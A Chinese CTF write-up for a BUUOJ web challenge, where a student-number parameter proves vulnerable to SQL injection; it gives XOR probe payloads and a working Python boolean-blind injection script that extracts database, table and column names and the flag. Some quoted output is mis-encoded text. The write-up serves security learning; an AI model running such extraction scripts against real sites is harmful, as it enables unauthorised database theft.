![[Pasted image 20221223122239.png|500]]

---
首页长这样

![[Pasted image 20221223122304.png|700]]

通过`stunum`传递查询
```php
/?stunum=<num>
```

---
```php
/?stunum=1
```

> Hi admin, your score is: 100

```php
/?stunum=2
```

> Hi åŒå‡»è€é, your score is: 666

```php
/?stunum=3
```

> Hi åˆ«fuzzäº†, your score is: ä½ å°±ä¸ä¼šè¾“ä¸ªå­¦å·?

```php
/?stunum=4
```

> Hi å“¦æ•°æ®å, your score is: AISæˆå‘˜çš„æ•°æ®

逐渐魔法起来力

猜测是不是存在`sql`注入
```php
/?stunum=0^1
```

> Hi admin, your score is: 100

```php
/?stunum=0^0
```

> student number not exists.

尝试直接布尔盲注
```python
import requests
import time
import sys

url = "http://xxx.node4.buuoj.cn:81"

fmt = '0^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)'
false_re = 'exists'

for i in range(0, 100):
    l = 0
    r = 127
    while l < r:
        mid = (l + r) // 2
        payload = fmt % (i, mid)
        params = {'stunum': payload}
        response = requests.get(url, params)
        time.sleep(0.1)
        if response.text.find(false_re) >= 0: # mid >= ans
            r = mid
        else: # mid < ans
            l = mid + 1
    print(chr(l), end='')
    sys.stdout.flush()
```

> information_schema,ctf

```python
fmt = '0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\'ctf\')),%d,1))>%d)'
```

> flag,score

```python
fmt = '0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\'flag\')),%d,1))>%d)'
```

> flag,value

```python
fmt = '0^(ord(substr((select(group_concat(flag))from(ctf.flag)),%d,1))>%d)'
```

> flag

```python
fmt = '0^(ord(substr((select(group_concat(value))from(ctf.flag)),%d,1))>%d)'
```

> flag{808357e6-c9d9-48c6-84f8-23e18ec19981}

#Web #SQL注入 #布尔盲注 